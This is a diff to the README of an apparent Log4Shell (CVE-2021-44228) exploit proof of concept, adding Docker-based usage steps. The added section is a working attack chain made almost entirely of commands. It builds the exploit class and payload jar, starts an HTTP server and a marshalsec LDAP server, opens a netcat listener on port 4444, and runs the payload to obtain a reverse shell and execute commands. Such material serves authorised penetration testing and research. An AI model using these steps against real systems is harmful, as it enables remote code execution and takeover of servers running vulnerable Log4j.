@@ -8,6 +8,57 @@ Java 8 required.
 
 ### Usage
 
+## 1. Using Docker
+
+Build project.
+
+```
+./build.sh
+# Runs the following commands:
+#   cd CVE-2021-44228-Apache-Log4j-Rce/
+#   javac Exploit.java
+#   mvn clean package
+#   docker build -t server . # Build python server docker image
+#   cd ../marshalsec/
+#   docker build -t japp . # Build ldap server docker image
+#   cd ..
+```
+
+Run httpserver.
+
+```
+cd CVE-2021-44228-Apache-Log4j-Rce/
+./run.sh
+# Runs the following command:
+#   docker run --rm -it --name server -p 8888:8888 server
+```
+
+Run LDAP server.
+
+```
+cd marshalsec/
+./run.sh
+# Runs the following command
+#   docker run --rm -it --name japp -p 1389:1389 japp
+```
+
+Create listener on port 4444.
+
+```
+nc -nlvp 4444
+```
+
+Run payload to execute reverse shell connection to our listener.
+
+```
+cd CVE-2021-44228-Apache-Log4j-Rce/
+java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j
+```
+
+You will now be able to execute shell commands.
+
+## 2. Running everything locally
+
 Download this project.
 
 ```
